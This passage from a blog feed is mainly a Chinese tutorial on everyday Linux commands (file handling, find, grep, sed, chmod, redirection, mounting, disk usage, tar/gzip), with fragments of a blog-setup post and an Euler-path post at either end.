<p>部署完毕，那我们如何编写文章？用普通文本编辑器？用HTML文件编写？其实，最方便的是使用.md文件编写，关于如何使用.md文件，请看<a href="https://yalexin.gitee.io/2020/02/23/markdown语法/">这里</a> </p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常用命令</title>
    <url>/2020/02/25/%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<blockquote>
<p>本文篇幅较大，下面是目录<br><a href="#Bash快捷键">Bash快捷键</a><br><a href="#文件及目录操作命令">文件及目录操作命令</a><br><a href="#权限相关命令">权限相关命令</a><br><a href="#重定向与管道命令">重定向相关与管道命令</a><br><a href="#挂载文件系统">挂载文件系统</a><br><a href="#磁盘管理">磁盘管理</a></p>
</blockquote>
<h2 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h2><p>删除光标到行首的所有字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctl + U</span><br></pre></td></tr></table></figure>

<p>删除当前光标到前边的最近一个空格之间的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctl + W</span><br></pre></td></tr></table></figure>

<h2 id="文件及目录操作命令"><a href="#文件及目录操作命令" class="headerlink" title="文件及目录操作命令"></a>文件及目录操作命令</h2><h3 id="显示当前所在目录-绝对路径"><a href="#显示当前所在目录-绝对路径" class="headerlink" title="显示当前所在目录 (绝对路径)"></a>显示当前所在目录 (绝对路径)</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br></pre></td></tr></table></figure>

<h3 id="进入某个目录"><a href="#进入某个目录" class="headerlink" title="进入某个目录"></a>进入某个目录</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> [path]</span></span><br></pre></td></tr></table></figure>

<p>  若path缺省，则会进入到用户主目录</p>
<h3 id="列出当前目录下所有的文件"><a href="#列出当前目录下所有的文件" class="headerlink" title="列出当前目录下所有的文件"></a>列出当前目录下所有的文件</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls [选项] [目录或者文件]</span></span><br></pre></td></tr></table></figure>

<p>  <strong>说明</strong> 对于目录，该命令列出其中所有的子目录和文件，缺省情况下是指向当前目录；对于文件，该命令列出文件名及其相关的文件属性信息。该命令常用选项如下表所示。</p>
<p><a name="权限相关命令1"></a></p>
<a id="more"></a>



<table>
<thead>
<tr>
<th><strong>常用选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>All。列出目录中全部文件，包含隐藏文件、父目录和当前目录。</td>
</tr>
<tr>
<td>- l</td>
<td>long。列出目录内容的细节，包括权限、所有者、组群、大小等。</td>
</tr>
<tr>
<td>-F</td>
<td>File type。在每一个列举项目后添加符号表明其类型。</td>
</tr>
<tr>
<td>-R</td>
<td>递归列举当前目录下所有目录的内容。</td>
</tr>
<tr>
<td>-S</td>
<td>Size。按文件大小排序。</td>
</tr>
</tbody></table>
<h3 id="显示文本文件"><a href="#显示文本文件" class="headerlink" title="显示文本文件"></a>显示文本文件</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat fileName</span></span><br></pre></td></tr></table></figure>
<p>  <strong>注意</strong> fileName需要包含路径，若不指明，则认为是当前目录,若要显示行数，添加-n选项即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat fileName -n</span></span><br></pre></td></tr></table></figure>

<p>查看前5行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> head -5 fileName</span></span><br></pre></td></tr></table></figure>

<p>查看后5行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tail -5 filename</span></span><br></pre></td></tr></table></figure>

<p>查看两个文件之间的差异</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> diff filename1 filename2</span></span><br></pre></td></tr></table></figure>

<h3 id="文件或目录的复制"><a href="#文件或目录的复制" class="headerlink" title="文件或目录的复制"></a>文件或目录的复制</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp [选项] 源文件或目录 目标目录</span></span><br></pre></td></tr></table></figure>

<p>  若指定多个源文件或者目录复制到目标目录，则源文件或源目录之间用空格分隔，常用选项若下表</p>
<table>
<thead>
<tr>
<th><strong>常用选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>在备份中尽可能多的保持源文件的结构和属性。</td>
</tr>
<tr>
<td>- f</td>
<td>覆盖已经存在的目标文件而不加以提示。</td>
</tr>
<tr>
<td>- i</td>
<td>在覆盖目标文件前给出提示并要求用户确认。</td>
</tr>
<tr>
<td>-r</td>
<td>若源文件为目录，递归复制该目录下所有子目录和文件。</td>
</tr>
</tbody></table>
<h3 id="文件或目录的移动（重命名）"><a href="#文件或目录的移动（重命名）" class="headerlink" title="文件或目录的移动（重命名）"></a>文件或目录的移动（重命名）</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mv 源文件或者目录 目标文件或目录</span></span><br></pre></td></tr></table></figure>

<p>  当目标目录不存在时，则将源文件或目录重命名；若需要将多个文件夹或者文件移到源文件，可用下面的命令</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mv 文件1 文件2 文件3 ... -t 目标文件夹</span></span><br></pre></td></tr></table></figure>

<h3 id="建立新目录"><a href="#建立新目录" class="headerlink" title="建立新目录"></a>建立新目录</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir [选项] 目录名</span></span><br></pre></td></tr></table></figure>

<p>  该命令需要用户拥有写的权利</p>
<h3 id="删除文件或者目录"><a href="#删除文件或者目录" class="headerlink" title="删除文件或者目录"></a>删除文件或者目录</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rm [选项] 文件或者目录</span></span><br></pre></td></tr></table></figure>

<p>  若需要删除多个文件或者文件夹，则文件或文件夹之间用空格隔开</p>
<p>  常用的选项如下</p>
<table>
<thead>
<tr>
<th><strong>常用选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-f</td>
<td>不给出提示，强行删除。</td>
</tr>
<tr>
<td>- r</td>
<td>删除文件列表中指定的目录，若无此标志则不删除目录。</td>
</tr>
<tr>
<td>- i</td>
<td>提示是否删除。</td>
</tr>
<tr>
<td>-R</td>
<td>递归删除目录，删除整个目录及其所有子目录。</td>
</tr>
</tbody></table>
<h3 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h3><p>按照名字搜索</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -name <span class="string">"*.txt"</span> <span class="comment"># 在当前目录下查找所有txt文件</span></span></span><br></pre></td></tr></table></figure>

<p>也可以查找所有非<code>.txt</code>文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . ! -name <span class="string">"*.txt"</span></span></span><br></pre></td></tr></table></figure>

<p>按照条件</p>
<table>
<thead>
<tr>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-atime</td>
<td>访问时间，单位是天</td>
</tr>
<tr>
<td>-amin</td>
<td>访问时间，单位是分钟</td>
</tr>
<tr>
<td>-mtime</td>
<td>修改时间 ，单位是天（内容发生变动)</td>
</tr>
<tr>
<td>-mmin</td>
<td>修改时间 ，单位是分钟（内容发生变动)</td>
</tr>
<tr>
<td>-size -n</td>
<td>大小小于n个字节的文件</td>
</tr>
<tr>
<td>-size +n</td>
<td>大小大于n个字节的文件</td>
</tr>
<tr>
<td>-perm</td>
<td>按照权限</td>
</tr>
<tr>
<td>-user</td>
<td>按用户</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -amin -5 -<span class="built_in">type</span> f <span class="comment"># 最近5分钟访问的文件</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -size -1k  <span class="comment"># 查找低于1kb的文件</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -perm 644 <span class="comment"># 查找权限是644的文件， 权限的知识在下面</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -user yalexin <span class="comment"># 查找yalexin用户拥有的文件</span></span></span><br></pre></td></tr></table></figure>

<h3 id="grep文本搜索"><a href="#grep文本搜索" class="headerlink" title="grep文本搜索"></a>grep文本搜索</h3><p>语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep match_patten  [参数] fileName</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-o</td>
<td>只输出匹配的文本，如在<code>1,txt</code>中寻找<code>test</code>：<code>grep &quot;test&quot; -o 1.txt</code></td>
</tr>
<tr>
<td>-v</td>
<td>只输出没有匹配的文本</td>
</tr>
<tr>
<td>-c</td>
<td>统计匹配的字段在文本中出现的次数。如在<code>1,txt</code>中寻找<code>a</code>的个数：<code>grep &quot;a&quot; -c 1.txt</code></td>
</tr>
<tr>
<td>-n</td>
<td>打印匹配的行号</td>
</tr>
<tr>
<td>-i</td>
<td>忽略大小写，如在<code>1,txt</code>中寻找<code>a</code>或者<code>A</code>：<code>grep &quot;a&quot; -i 1.txt</code></td>
</tr>
</tbody></table>
<h3 id="sort排序"><a href="#sort排序" class="headerlink" title="sort排序"></a>sort排序</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-n</td>
<td>按数字进行排序</td>
</tr>
<tr>
<td>-d</td>
<td>按字典序进行排序</td>
</tr>
<tr>
<td>-r</td>
<td>逆序排序</td>
</tr>
<tr>
<td>-k n</td>
<td>指定按第N列排序</td>
</tr>
</tbody></table>
<p>例如，将<code>1.txt</code>文件中的第一列按照数字，以行为单位逆序排列：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sort -nrk 1 1.txt</span></span><br></pre></td></tr></table></figure>

<h3 id="uniq-消除重复行"><a href="#uniq-消除重复行" class="headerlink" title="uniq 消除重复行"></a>uniq 消除重复行</h3><p>不重复显示<code>1.txt</code>的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq</span></span><br></pre></td></tr></table></figure>

<p>统计文本中各行出现的次数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq -c</span></span><br></pre></td></tr></table></figure>

<p>找出重复行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq -d</span></span><br></pre></td></tr></table></figure>

<h3 id="cut切割文本"><a href="#cut切割文本" class="headerlink" title="cut切割文本"></a>cut切割文本</h3><p><code>cut</code> 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p>
<p><code>cut</code>可以将文件作为数据源,也可以通过管道的方式指定数据源地方</p>
<p>语法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cut 参数 数据</span></span><br></pre></td></tr></table></figure>

<p>主要参数:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-b</td>
<td>按字节为单位切割</td>
</tr>
<tr>
<td>-c</td>
<td>按字符为单位切割</td>
</tr>
<tr>
<td>-d</td>
<td>自定义分隔符，默认为制表符</td>
</tr>
<tr>
<td>-f</td>
<td>制定切割的区间</td>
</tr>
<tr>
<td>-n</td>
<td>取消分割多字节字符</td>
</tr>
</tbody></table>
<p>例如：<code>ls -l | cut -c 1-10</code>可以显示出当前文件夹下所有文件和文件夹的权限。</p>
<p>特别要注意一下，假如我们想要用<code>-b</code>提取每一行的中文时，要注意，在<code>utf-8</code>的编码下一个汉字占用3个字节，如果开始和结束位置没有定位正确，切割的结果将会有乱码现象。</p>
<h3 id="paste拼接文本"><a href="#paste拼接文本" class="headerlink" title="paste拼接文本"></a>paste拼接文本</h3><p>将两个文本文件的内容拼接。</p>
<p>例如：文件一内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>文件二内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文字一</span><br><span class="line">文字二</span><br><span class="line">文字三</span><br><span class="line">文字四</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> paste test1.txt test2.txt</span></span><br><span class="line">1	文字一</span><br><span class="line">2	文字二</span><br><span class="line">3	文字三</span><br><span class="line">4	文字四</span><br></pre></td></tr></table></figure>

<p>默认是以制表符（Tab）为定界符，可以利用<code>-d</code>制定定界符，如以空格：<code>paste test1.txt test2.txt -d &quot; &quot;</code></p>
<h3 id="wc统计工具"><a href="#wc统计工具" class="headerlink" title="wc统计工具"></a>wc统计工具</h3><p>统计行数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -l fileName</span></span><br></pre></td></tr></table></figure>

<p>统计单词数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -w fileName</span></span><br></pre></td></tr></table></figure>

<p>统计字符数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -c fileName</span></span><br></pre></td></tr></table></figure>

<h3 id="sed文本替换"><a href="#sed文本替换" class="headerlink" title="sed文本替换"></a>sed文本替换</h3><p>将第一个匹配的内容替换：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/原内容/新内容/'</span> fileName</span></span><br></pre></td></tr></table></figure>

<p>全局替换：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/原内容/新内容/g'</span> fileName</span></span><br></pre></td></tr></table></figure>

<p>默认情况下是显示替换后的内容，对原文件不修改，假如想要修改原文件，加上<code>-i</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/原内容/新内容/g'</span> fileName -i</span></span><br></pre></td></tr></table></figure>

<p>或者将修改后的内容放到新文件中：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/原内容/新内容/g'</span> fileName &gt; newFileName</span></span><br></pre></td></tr></table></figure>

<h2 id="权限相关命令"><a href="#权限相关命令" class="headerlink" title="权限相关命令"></a>权限相关命令</h2><p><strong>权限的含义</strong>：Linux系统中的每个文件和目录都有相应的访问许可权限，访问权限分为只读（r），可写（w）和可执行（x）三种。有三种不同类型的用户可对文件或目录进行访问，分别是文件所有者（u），同组用户（g）和其他用户（o）。所有的文件和目录都被创建它们的人所“拥有”，只要你是这个文件的所有者或你登录为根用户，你就拥有了改变所有者、组群和其他人权限的权利。</p>
<h3 id="查看当前文件夹下的文件夹或者文件的权限"><a href="#查看当前文件夹下的文件夹或者文件的权限" class="headerlink" title="查看当前文件夹下的文件夹或者文件的权限"></a>查看当前文件夹下的文件夹或者文件的权限</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l</span></span><br></pre></td></tr></table></figure>

  <img src="/2020/02/25/%E5%91%BD%E4%BB%A4/1.png" class>

<p>  第一个是说明是文件（-）还是文件夹（d），然后是9个字符，每三个一组，表明了权限属性，分别是所有者、所属组、其他人拥有的权限，</p>
<h3 id="使用文字设定法改变权限"><a href="#使用文字设定法改变权限" class="headerlink" title="使用文字设定法改变权限"></a>使用文字设定法改变权限</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod [用户身份] [操作符][mode] 文件名 [-R]</span></span><br></pre></td></tr></table></figure>

<p>  可改变用户或同组用户或其它用户对指定文件名的存取权限，在文字设定法中，chmod命令各选项含义如下表</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>符号</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>用户身份</td>
<td>u</td>
<td>user,表示文件或目录的所有者。</td>
</tr>
<tr>
<td>用户身份</td>
<td>g</td>
<td>group，表示与文件主同组的用户。</td>
</tr>
<tr>
<td>用户身份</td>
<td>o</td>
<td>other，表示其他用户。</td>
</tr>
<tr>
<td>用户身份</td>
<td>a</td>
<td>all，表示所有用户。</td>
</tr>
<tr>
<td>操作符</td>
<td>＋</td>
<td>增添权限</td>
</tr>
<tr>
<td>操作符</td>
<td>－</td>
<td>删除权限</td>
</tr>
<tr>
<td>操作符</td>
<td>＝</td>
<td>赋予给定权限并取消其它所有权限。</td>
</tr>
<tr>
<td>权限</td>
<td>r</td>
<td>读取权</td>
</tr>
<tr>
<td>权限</td>
<td>w</td>
<td>写入权</td>
</tr>
<tr>
<td>权限</td>
<td>x</td>
<td></td>
</tr>
<tr>
<td></td>
<td>-R</td>
<td>递归修改子目录及文件</td>
</tr>
</tbody></table>
<p>  如给所有者添加执行权限</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod u+x 45</span></span><br></pre></td></tr></table></figure>
  <img src="/2020/02/25/%E5%91%BD%E4%BB%A4/2.png" class>

<p>  也可以给多个用户修改权限</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod u+x,g+w 文件名</span></span><br></pre></td></tr></table></figure>

<h3 id="使用数字法改变权限"><a href="#使用数字法改变权限" class="headerlink" title="使用数字法改变权限"></a>使用数字法改变权限</h3><p>  首先说明w、x、r、的权值如下</p>
<p>  r ———- 4</p>
<p>  w ——— 2</p>
<p>  x ———- 1</p>
<p>  因此一组权限的组合可以由下表所示</p>
<table>
<thead>
<tr>
<th>数字和</th>
<th>权限组合</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>—</td>
</tr>
<tr>
<td>1</td>
<td>–x</td>
</tr>
<tr>
<td>2</td>
<td>-w-</td>
</tr>
<tr>
<td>3</td>
<td>-wx</td>
</tr>
<tr>
<td>4</td>
<td>r–</td>
</tr>
<tr>
<td>5</td>
<td>r-x</td>
</tr>
<tr>
<td>6</td>
<td>rw-</td>
</tr>
<tr>
<td>7</td>
<td>rwx</td>
</tr>
</tbody></table>
<p>  例如我们想给某个文件或文件夹的权限改成rwxr-x-w-，就可以用命令</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod 752 文件名或者文件夹名</span></span><br></pre></td></tr></table></figure>
<p>  如果熟记上面的对应关系，就可以很方便地修改权限了。</p>
<h2 id="重定向与管道命令"><a href="#重定向与管道命令" class="headerlink" title="重定向与管道命令"></a>重定向与管道命令</h2><p>Linux默认的标准输入（stdin）是键盘，标准输出（stdout）是显示器。如果需要从非标准输入输出设备进行输入或输出，则需要通过输入输出重定向。</p>
<h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><p>如：命令 &lt; 文件名</p>
<p>将命令（或可执行程序）的标准输入重定向到指定的文件中。</p>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat &lt; /etc.txt1</span></span><br></pre></td></tr></table></figure>
<p>表示将/etc.txt1的文件内容作为cat命令的输入，显示到屏幕。</p>
<h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>如：命令 &gt; 文件名</p>
<p> 将命令（或可执行程序）的标准输出或标准错误输出重定向到指定文件中。</p>
<p>例如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls  /etc &gt; /test1/etc.txt</span></span><br></pre></td></tr></table></figure>
<p>表示将/etc目录下的文件列表输出到文件/text1/etc.txt中。</p>
<h3 id="追加重定向"><a href="#追加重定向" class="headerlink" title="追加重定向"></a>追加重定向</h3><p>如：  命令 &gt;&gt; 文件名</p>
<p>表示将一条命令（或可执行程序）的输出结果追加到指定文件的后面。</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>如： 命令 | 命令</p>
<p>表示将一个命令（或程序）的输出作为另一个命令（或程序）的输入。</p>
<h2 id="挂载文件系统"><a href="#挂载文件系统" class="headerlink" title="挂载文件系统"></a>挂载文件系统</h2><h3 id="fdisk命令"><a href="#fdisk命令" class="headerlink" title="fdisk命令"></a>fdisk命令</h3><p>fdisk命令用于观察硬盘实体使用情况，也可对硬盘分区。它采用传统的问答式界面，而非类似DOS fdisk的cfdisk互动式操作界面，因此在使用上较为不便，但功能却丝毫不打折扣。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fdisk(选项)(参数)</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>-b&lt;分区大小&gt;</td>
<td>指定每个分区的大小</td>
</tr>
<tr>
<td>-l</td>
<td>列出指定的外围设备的分区表状况</td>
</tr>
<tr>
<td>-s&lt;分区编号&gt;</td>
<td>将指定的分区大小输出到标准输出上，单位为区块</td>
</tr>
<tr>
<td>-u</td>
<td>搭配”-l”参数列表，会用分区数目取代柱面数目，来表示每个分区的起始地址</td>
</tr>
<tr>
<td>-v</td>
<td>显示版本信息</td>
</tr>
</tbody></table>
<p>参数：指定要进行分区或者显示分区的硬盘设备文件。</p>
<h3 id="挂载命令"><a href="#挂载命令" class="headerlink" title="挂载命令"></a>挂载命令</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount [选项] 设备 存放目录</span></span><br></pre></td></tr></table></figure>

<p>该命令可以将Linux支持的文件系统挂载到指定的目录。常用选项如下表所示：</p>
<table>
<thead>
<tr>
<th>常用选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>挂上/etc/fstab下列出的全部文件系统</td>
</tr>
<tr>
<td>-t</td>
<td>指定挂上的文件系统的名称</td>
</tr>
<tr>
<td>-n</td>
<td>挂上文件系统时不把文件系统的数据写入/etc/mtab中</td>
</tr>
<tr>
<td>-w</td>
<td>将文件系统设定为可读写</td>
</tr>
</tbody></table>
<h3 id="挂载软盘"><a href="#挂载软盘" class="headerlink" title="挂载软盘"></a>挂载软盘</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/fd0  /mnt/floppy</span></span><br></pre></td></tr></table></figure>
<p>事先在/mnt/目录下建立floppy目录，之后将设备号为fd0的软盘挂载到该目录。</p>
<h3 id="挂载U盘"><a href="#挂载U盘" class="headerlink" title="挂载U盘"></a>挂载U盘</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/sda1  /mnt/usb</span></span><br></pre></td></tr></table></figure>
<p>在/mnt/目录下建立usb目录，将设备号为sda1的U盘挂载到该目录。</p>
<h3 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/cdrom  /mnt/cdrom</span></span><br></pre></td></tr></table></figure>
<p>在/mnt/目录下建立cdrom目录，将设备名为cdrom的光盘挂载到该目录。</p>
<h3 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> umount 设备</span></span><br></pre></td></tr></table></figure>
<p>该命令可将已经挂载的指定设备进行卸载。某些设备，如光盘，若不卸载将无法取出。</p>
<h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><h3 id="查看磁盘空间"><a href="#查看磁盘空间" class="headerlink" title="查看磁盘空间"></a>查看磁盘空间</h3><p>查看磁盘大小和利用率：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> df -h</span></span><br></pre></td></tr></table></figure>

<p><code>-h</code>是以易读的方向显现，自动更改单位，即GB/MB/KB，不加该选项则以B为单位显示。</p>
<p>查看当前目录占用空间大小：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> du -sh</span></span><br></pre></td></tr></table></figure>

<p><code>-s</code>是递归整个目录大小</p>
<p>查看当前文件夹下各个文件的大小：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> du -sh *</span></span><br></pre></td></tr></table></figure>

<h3 id="打包和压缩"><a href="#打包和压缩" class="headerlink" title="打包和压缩"></a>打包和压缩</h3><p> 打包是指将几个文件或目录变成一个总的文件，压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 </p>
<ul>
<li><p>打包</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>产生新的包</td>
</tr>
<tr>
<td>-f</td>
<td>指定包的文件名</td>
</tr>
<tr>
<td>-r</td>
<td>指定新文件加入到包中</td>
</tr>
<tr>
<td>-t</td>
<td>列出包中文件</td>
</tr>
<tr>
<td>-u</td>
<td>更新包中某个文件</td>
</tr>
<tr>
<td>-v</td>
<td>显示进度</td>
</tr>
</tbody></table>
<p>例如：打包当前文件夹下所有的<code>txt</code>文件并显示进度：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -cvf new.tar *.txt</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>压缩：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gzip new.tar</span></span><br></pre></td></tr></table></figure>

<p>将会生成<code>new.tar.gz</code>的文件。</p>
</li>
</ul>
<p>也可以一条命令将文件打包并压缩：</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -cvzf one.tar.gz *.txt</span></span><br></pre></td></tr></table></figure>

<p>  <code>-z</code>是调用<code>gzip</code></p>
<h3 id="解压缩和解包"><a href="#解压缩和解包" class="headerlink" title="解压缩和解包"></a>解压缩和解包</h3><ul>
<li><p>解压缩</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gunzip one.tar.gz</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>解包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -xf one.tar</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里同样支持一条命令将压缩包解压并解包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -xzf one.tar.gz</span></span><br></pre></td></tr></table></figure>

<p>除了<code>gzip</code>，还可以用<code>bz2</code>。用法如下：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>调用方式</th>
<th>对应压缩包文件</th>
</tr>
</thead>
<tbody><tr>
<td>gzip</td>
<td>-z</td>
<td>.gz</td>
</tr>
<tr>
<td>bzip2</td>
<td>-j</td>
<td>.bz2</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>图论之欧拉路</title>
    <url>/2021/04/25/%E5%9B%BE%E8%AE%BA%E4%B9%8B%E6%AC%A7%E6%8B%89%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="欧拉路"><a href="#欧拉路" class="headerlink" title="欧拉路"></a>欧拉路</h2><blockquote>
<p>给定无孤立节点图<code>G</code>，若存在一条路，经过图中的每一条边一次且仅一次，那么该条路称为欧拉路，如果这条路的起点和终点相同，则该路称为欧拉回路，否则称为欧拉通路。</p>
</blockquote>
<a id="more"></a>

